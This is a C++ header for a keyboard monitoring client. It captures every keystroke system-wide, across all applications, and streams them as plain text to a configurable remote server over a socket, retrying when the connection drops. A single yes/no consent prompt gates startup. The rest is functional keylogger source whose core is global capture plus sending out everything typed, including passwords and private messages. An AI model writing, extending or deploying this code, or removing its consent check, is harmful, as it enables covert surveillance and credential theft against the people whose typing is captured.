#ifndef CLIENT_HPP
#define CLIENT_HPP

#include "keyboard_capture.hpp"
#include "socket_utils.hpp"
#include "thread_safe_queue.hpp"
#include <thread>
#include <atomic>
#include <iostream>

class Client {
private:
    std::string server_host_;
    int server_port_;
    std::atomic<bool> running_;
    std::thread network_thread_;
    ThreadSafeQueue<std::string> keystroke_queue_;
    std::unique_ptr<KeyboardCapture> keyboard_capture_;

public:
    Client(const std::string& host, int port) 
        : server_host_(host), server_port_(port), running_(false) {}

    ~Client() {
        stop();
    }

    bool start() {
        if (running_) {
            return false;
        }

        running_ = true;
        
        // Initialize keyboard capture
        keyboard_capture_ = std::make_unique<KeyboardCapture>(
            [this](const std::string& key) {
                keystroke_queue_.push(key);
            }
        );

        // Get user consent
        if (!getUserConsent()) {
            std::cout << "Consent not granted. Exiting." << std::endl;
            return false;
        }

        // Start keyboard capture
        if (!keyboard_capture_->start()) {
            std::cerr << "Failed to start keyboard capture" << std::endl;
            return false;
        }

        // Start network thread
        network_thread_ = std::thread(&Client::networkLoop, this);

        std::cout << "Client started. Capturing global keystrokes..." << std::endl;
        return true;
    }

    void stop() {
        running_ = false;
        if (keyboard_capture_) {
            keyboard_capture_->stop();
        }
        if (network_thread_.joinable()) {
            network_thread_.join();
        }
    }

private:
    bool getUserConsent() {
        std::cout << "=== KEYBOARD MONITORING CLIENT ===" << std::endl;
        std::cout << "This application will capture ALL keystrokes on your system," << std::endl;
        std::cout << "including those typed in other applications, and send them" << std::endl;
        std::cout << "to the server at " << server_host_ << ":" << server_port_ << std::endl;
        std::cout << std::endl;
        std::cout << "Do you give explicit permission for this monitoring? (yes/no): ";
        
        std::string response;
        std::getline(std::cin, response);
        
        return (response == "yes" || response == "y" || response == "YES" || response == "Y");
    }

    void networkLoop() {
        while (running_) {
            try {
                int sockfd = SocketUtils::createSocket();
                SocketUtils::connectToServer(sockfd, server_host_, server_port_);
                
                std::cout << "Connected to server" << std::endl;

                while (running_) {
                    auto key_opt = keystroke_queue_.pop();
                    if (key_opt) {
                        std::string message = *key_opt + "\n";
                        if (!SocketUtils::sendData(sockfd, message)) {
                            std::cerr << "Failed to send data. Reconnecting..." << std::endl;
                            break;
                        }
                    }
                    
                    // Small delay to prevent busy waiting
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                }

                close(sockfd);
            } catch (const std::exception& e) {
                std::cerr << "Connection error: " << e.what() << ". Retrying in 5 seconds..." << std::endl;
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
    }
};

#endif